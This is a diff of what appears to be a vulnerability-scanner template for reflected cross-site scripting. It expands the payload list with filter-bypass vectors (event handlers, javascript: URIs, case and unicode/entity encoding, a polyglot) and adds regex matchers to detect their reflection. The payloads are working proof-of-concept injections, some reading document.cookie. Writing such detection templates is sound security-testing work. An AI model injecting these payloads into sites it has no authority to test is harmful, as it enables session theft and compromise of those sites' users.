@@ -1,8 +1,7 @@
 id: generic-xss-reflected
 info:
-  name: Reflected XSS
-  severity: high
-  description: Generic reflected cross-site scripting testing
+  name: Reflected XSS - Advanced
+  description: Reflected XSS with bypass techniques and multiple vectors
   tags:
     - xss
     - reflected
@@ -10,56 +9,116 @@ info:
 
 generic:
   endpoint: "{{xss_reflected}}"
-
   method: GET
-
-  parameter: "input"
+  parameter: "q"
 
   payloads:
-    - name: "script_alert"
-      value: "<script>alert(document.cookie)</script>"
-      description: "Basic script tag"
+    # Basic vectors
+    - name: "script_basic"
+      value: "<script>alert(1)</script>"
 
+    - name: "script_cookie"
+      value: "<script>alert(document.cookie)</script>"
+
+    # Event handlers
     - name: "img_onerror"
       value: "<img src=x onerror=alert(1)>"
-      description: "IMG onerror event"
+
+    - name: "img_onerror_attr"
+      value: "<img src=x onerror=alert(document.cookie)>"
 
     - name: "svg_onload"
       value: "<svg onload=alert(1)>"
-      description: "SVG onload event"
+
+    - name: "svg_onload_body"
+      value: "<svg/onload=alert(document.body)>"
 
     - name: "body_onload"
       value: "<body onload=alert(1)>"
-      description: "BODY onload event"
 
     - name: "iframe_onload"
       value: "<iframe onload=alert(1)>"
-      description: "IFRAME onload event"
 
     - name: "input_onfocus"
       value: "<input onfocus=alert(1) autofocus>"
-      description: "INPUT onfocus with autofocus"
 
-    - name: "details_open"
+    - name: "details_ontoggle"
       value: "<details open ontoggle=alert(1)>"
-      description: "DETAILS ontoggle event"
 
     - name: "marquee_onstart"
       value: "<marquee onstart=alert(1)>"
-      description: "MARQUEE onstart event"
 
-    - name: "video_poster"
+    # JavaScript URIs
+    - name: "a_href_js"
+      value: "<a href=javascript:alert(1)>click</a>"
+
+    - name: "iframe_src_js"
+      value: "<iframe src=javascript:alert(1)>"
+
+    - name: "video_poster_js"
       value: "<video poster=javascript:alert(1)>"
-      description: "VIDEO poster javascript"
+
+    # Case variation bypass
+    - name: "script_upper"
+      value: "<SCRIPT>alert(1)</SCRIPT>"
+
+    - name: "img_mixed"
+      value: "<ImG sRc=x oNeRrOr=alert(1)>"
+
+    # Attribute injection
+    - name: "img_src_error"
+      value: "><img src=x onerror=alert(1)>"
+
+    - name: "div_onmouse"
+      value: "<div onmouseover=alert(1)>X</div>"
+
+    # Data URI
+    - name: "object_data"
+      value: '<object data="javascript:alert(1)">'
+
+    # Unicode bypass
+    - name: "script_unicode"
+      value: "<script>\\u0061lert(1)</script>"
+
+    - name: "img_unicode"
+      value: "<img src=x onerror=\\u0061lert(1)>"
+
+    # HTML entities bypass
+    - name: "script_entities"
+      value: "<script>alert(&#88;&#83;&#83;)</script>"
+
+    # Polyglot
+    - name: "polyglot"
+      value: "javascript://--></script></title></style></textarea><img src=x onerror=alert(1)>"
+
+    # Style injection
+    - name: "style_expr"
+      value: "<style>body{background:url('javascript:alert(1)')}</style>"
+
+    # Math-based
+    - name: "math_xlink"
+      value: "<math><mtext><option><optgroup>&#13;<script>alert(1)</script>"
 
   matchers:
-    - type: word
-      words:
-        - "<script>alert("
-        - "<img src=x onerror="
-        - "<svg onload="
-        - "<body onload="
-        - "<iframe onload="
-        - "<input onfocus="
-        - "<details open ontoggle="
+    # Direct patterns
+    - type: regex
       condition: or
+      regex:
+        - "<script>alert\\("
+        - "<img[^>]+onerror"
+        - "<svg[^>]+onload"
+        - "<body[^>]+onload"
+        - "javascript:"
+        - "onfocus=alert"
+        - "onmouseover=alert"
+        - "ontoggle=alert"
+
+    # Encoded patterns
+    - type: word
+      condition: or
+      words:
+        - "&#x61;"
+        - "&#106;"
+        - "&lt;script"
+        - "\\u0061"
+        - "javascript:"
